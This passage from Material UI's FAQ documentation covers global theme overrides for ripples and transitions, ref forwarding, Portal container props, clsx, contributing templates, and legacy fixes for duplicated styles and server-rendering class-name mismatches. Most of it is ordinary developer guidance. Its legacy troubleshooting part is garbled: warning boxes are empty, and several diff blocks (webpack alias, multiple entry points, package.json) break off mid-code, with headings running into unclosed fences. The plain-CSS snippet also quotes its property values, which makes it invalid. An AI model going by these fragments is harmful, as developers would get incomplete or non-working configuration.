This prevents interacting with the background when the modal should be the only interactive content. However, removing the scrollbar can make your **fixed positioned elements** move.
In this situation, you can apply a global `.mui-fixed` class name to tell Material UI to handle those elements.

## How can I disable the ripple effect globally?

The ripple effect is exclusively coming from the `BaseButton` component.
You can disable the ripple effect globally by providing the following in your theme:

```js
import { createTheme } from '@mui/material';

const theme = createTheme({
  components: {
    // Name of the component ⚛️
    MuiButtonBase: {
      defaultProps: {
        // The props to apply
        disableRipple: true, // No more ripple, on the whole application 💣!
      },
    },
  },
});
```

## How can I disable transitions globally?

Material UI uses the same theme helper for creating all its transitions.
Therefore you can disable all transitions by overriding the helper in your theme:

```js
import { createTheme } from '@mui/material';

const theme = createTheme({
  transitions: {
    // So `transition: none;` gets applied everywhere
    create: () => 'none',
  },
});
```

It can be useful to disable transitions during visual testing or to improve performance on low-end devices.

You can go one step further by disabling all transitions and animations effects:

```js
import { createTheme } from '@mui/material';

const theme = createTheme({
  components: {
    // Name of the component ⚛️
    MuiCssBaseline: {
      styleOverrides: {
        '*, *::before, *::after': {
          transition: 'none !important',
          animation: 'none !important',
        },
      },
    },
  },
});
```

Notice that the usage of `CssBaseline` is required for the above approach to work.
If you choose not to use it, you can still disable transitions and animations by including these CSS rules:

```css
*,
*::before,
*::after {
  transition: 'none !important';
  animation: 'none !important';
}
```

## Do I have to use Emotion to style my app?

No, it's not required.
But if you are using the default styled engine (`@mui/styled-engine`) the Emotion dependency comes built in, so carries no additional bundle size overhead.

Perhaps, however, you're adding some Material UI components to an app that already uses another styling solution,
or are already familiar with a different API, and don't want to learn a new one? In that case, head over to the
[Style library interoperability](/material-ui/integrations/interoperability/) section to learn how to restyle Material UI components with alternative style libraries.

## When should I use inline-style vs. CSS?

As a rule of thumb, only use inline-styles for dynamic style properties.
The CSS alternative provides more advantages, such as:

- auto-prefixing
- better debugging
- media queries
- keyframes

## How do I use react-router?

Visit the guide about [integration with third-party routing libraries](/material-ui/integrations/routing/), like react-router or Next.js, for more details.

## How can I access the DOM element?

All Material UI components that should render something in the DOM forward their
ref to the underlying DOM component. This means that you can get DOM elements
by reading the ref attached to Material UI components:

```jsx
// or a ref setter function
const ref = React.createRef();
// render
<Button ref={ref} />;
// usage
const element = ref.current;
```

If you're not sure if the Material UI component in question forwards its ref you can check the API documentation under "Props."
You should find the message below, like in the [Button API](/material-ui/api/button/#props).

> The ref is forwarded to the root element.

## My App doesn't render correctly on the server

If it doesn't work, in 99% of cases it's a configuration issue.
A missing property, a wrong call order, or a missing component – server-side rendering is strict about configuration.

The best way to find out what's wrong is to compare your project to an **already working setup**.
Check out the [reference implementations](/material-ui/guides/server-rendering/#reference-implementations), bit by bit.

## Why are the colors I am seeing different from what I see here?

The documentation site is using a custom theme. Hence, the color palette is
different from the default theme that Material UI ships. Please refer to [this
page](/material-ui/customization/theming/) to learn about theme customization.

## Why does component X require a DOM node in a prop instead of a ref object?

Components like the [Portal](/material-ui/api/portal/#props) or [Popper](/material-ui/api/popper/#props) require a DOM node in the `container` or `anchorEl` prop respectively.
It seems convenient to simply pass a ref object in those props and let Material UI access the current value.

This works in a simple scenario:

```jsx
function App() {
  const container = React.useRef(null);

  return (
    <div className="App">
      <Portal container={container}>
        <span>portaled children</span>
      </Portal>
      <div ref={container} />
    </div>
  );
}
```

where `Portal` would only mount the children into the container when `container.current` is available.
Here is a naive implementation of Portal:

```jsx
function Portal({ children, container }) {
  const [node, setNode] = React.useState(null);

  React.useEffect(() => {
    setNode(container.current);
  }, [container]);

  if (node === null) {
    return null;
  }
  return ReactDOM.createPortal(children, node);
}
```

With this simple heuristic `Portal` might re-render after it mounts because refs are up-to-date before any effects run.
However, just because a ref is up-to-date doesn't mean it points to a defined instance.
If the ref is attached to a ref forwarding component it is not clear when the DOM node will be available.
In the example above, the `Portal` would run an effect once, but might not re-render because `ref.current` is still `null`.
This is especially apparent for React.lazy components in Suspense.
The above implementation could also not account for a change in the DOM node.

This is why a prop is required to the actual DOM node so that React can take care of determining when the `Portal` should re-render:

```jsx
function App() {
  const [container, setContainer] = React.useState(null);
  const handleRef = React.useCallback(
    (instance) => setContainer(instance),
    [setContainer],
  );

  return (
    <div className="App">
      <Portal container={container}>
        <span>Portaled</span>
      </Portal>
      <div ref={handleRef} />
    </div>
  );
}
```

## What's the clsx dependency for?

[clsx](https://github.com/lukeed/clsx) is a tiny utility for constructing `className` strings conditionally, out of an object with keys being the class strings, and values being booleans.

Instead of writing:

```jsx
// let disabled = false, selected = true;

return (
  <div
    className={`MuiButton-root ${disabled ? 'Mui-disabled' : ''} ${
      selected ? 'Mui-selected' : ''
    }`}
  />
);
```

you can do:

```jsx
import clsx from 'clsx';

return (
  <div
    className={clsx('MuiButton-root', {
      'Mui-disabled': disabled,
      'Mui-selected': selected,
    })}
  />
);
```

## I cannot use components as selectors in the styled() utility. What should I do?

If you are getting the error: `TypeError: Cannot convert a Symbol value to a string`, take a look at the [styled()](/system/styled/#how-to-use-components-selector-api) docs page for instructions on how you can fix this.

## How can I contribute to the free templates?

The templates are built using a [shared theme](https://github.com/mui/material-ui/tree/v6.0.2/docs/data/material/getting-started/templates/shared-theme). Below are the structure to create a new template:

### Template page

Create a new page in the `docs/pages/material-ui/getting-started/templates/<name>.js` directory with the following code:

```js
import * as React from 'react';
import AppTheme from 'docs/src/modules/components/AppTheme';
import TemplateFrame from 'docs/src/modules/components/TemplateFrame';
import Template from 'docs/data/material/getting-started/templates/<name>/<Template>';

export default function Page() {
  return (
    <AppTheme>
      <TemplateFrame>
        <Template />
      </TemplateFrame>
    </AppTheme>
  );
}
```

Then create a template file at `docs/data/material/getting-started/templates/<name>/<Template>.tsx` (add more files if needed):

> Note: The `<Template>` must be a pascal case string of the `<name>` folder.

### Shared theme

The template must use `AppTheme` from `../shared-theme/AppTheme` to ensure a consistent look and feel across all templates.

If the template includes custom-themed components, such as the dashboard template with MUI X themed components, pass them to the `AppTheme`'s `themedComponents` prop:

```js
import AppTheme from '../shared-theme/AppTheme';

const xThemeComponents = {
  ...chartsCustomizations,
  ...dataGridCustomizations,
  ...datePickersCustomizations,
  ...treeViewCustomizations,
};

export default function Dashboard(props: { disableCustomTheme?: boolean }) {
  return (
    <AppTheme {...props} themeComponents={xThemeComponents}>...</AppTheme>
  )
}
```

### Color mode toggle

The shared theme provides 2 appearance of the color mode toggle, `ColorModeSelect` and `ColorModeIconDropdown`.
You can use either of them in your template, it will be hidden within the `TemplateFrame` but will be visible in the CodeSandbox and StackBlitz.

### Template frame

If the template has a sidebar or a header that needs to stick to the top, refer to the CSS variable `--template-frame-height` to adjust.

For example, the dashboard template has a fixed header that needs to be accounted for the template frame height:

```js
<AppBar
  position="fixed"
  sx={{
    top: 'var(--template-frame-height, 0px)',
    // ...other styles
  }}
>
```

This will make the `AppBar` stay below the `TemplateFrame` in a preview mode but stick to the top in the CodeSandbox and StackBlitz.

## [legacy] I have several instances of styles on the page

> **Warning:**
>

### Possible reasons

There are several common reasons for this to happen:

### Duplicated module in node_modules

If you identified that duplication is the issue that you are encountering there are several things you can try to solve it:

If you are using npm you can try running `npm dedupe`.
This command searches the local dependencies and tries to simplify the structure by moving common dependencies further up the tree.

```diff
 resolve: {
+  alias: {
### Running multiple applications on one page

```diff
  module.exports = {
    entry: {
## [legacy] Why aren't my components rendering correctly in production builds?

The #1 reason this happens is likely due to class name conflicts once your code is in a production bundle.
For Material UI to work, the `className` values of all components on a page must be generated by a single instance of the [class name generator](https://v6.mui.com/system/styles/advanced/#class-names).

To correct this issue, all components on the page need to be initialized such that there is only ever **one class name generator** among them.

You could end up accidentally using two class name generators in a variety of scenarios:

> **Success:**
>
> If you are using webpack with the [SplitChunksPlugin](https://webpack.js.org/plugins/split-chunks-plugin/), try configuring the [`runtimeChunk` setting under `optimizations`](https://webpack.js.org/configuration/optimization/#optimization-runtimechunk).


Overall, it's simple to recover from this problem by wrapping each Material UI application with [`StylesProvider`](https://v6.mui.com/system/styles/api/#stylesprovider) components at the top of their component trees **and using a single class name generator shared among them**.

### [legacy] CSS works only on first load and goes missing

The CSS is only generated on the first load of the page.
Then, the CSS is missing on the server for consecutive requests.

#### Action to Take

The styling solution relies on a cache, the _sheets manager_, to only inject the CSS once per component type
(if you use two buttons, you only need the CSS of the button one time).
You need to create **a new `sheets` instance for each request**.

Example of fix:

```diff
-// Create a sheets instance.
-const sheets = new ServerStyleSheets();

 function handleRender(req, res) {
+  // Create a sheets instance.
+  const sheets = new ServerStyleSheets();

   //…

   // Render the component to a string.
   const html = ReactDOMServer.renderToString(
```

### [legacy] React class name hydration mismatch

> **Warning:**
>
> Prop className did not match.


There is a class name mismatch between the client and the server. It might work for the first request.
Another symptom is that the styling changes between initial page load and the downloading of the client scripts.

#### Action to Take

The class names value relies on the concept of [class name generator](https://v6.mui.com/system/styles/advanced/#class-names).
The whole page needs to be rendered with **a single generator**.
This generator needs to behave identically on the server and on the client. For instance:

- You need to provide a new class name generator for each request.
  But you shouldn't share a `createGenerateClassName()` between different requests:

  Example of fix:

  ```diff
  -// Create a new class name generator.
  -const generateClassName = createGenerateClassName();

   function handleRender(req, res) {
  +  // Create a new class name generator.
  +  const generateClassName = createGenerateClassName();

     //…

     // Render the component to a string.
     const html = ReactDOMServer.renderToString(
  ```

- You need to verify that your client and server are running the **exactly the same version** of Material UI.
  It is possible that a mismatch of even minor versions can cause styling problems.
  You can also ensure the same version in different environments by specifying a specific Material UI version in the dependencies of your package.json.

  _example of fix (package.json):_

  ```diff
    "dependencies": {
      ...
- You need to make sure that the server and the client share the same `process.env.NODE_ENV` value.
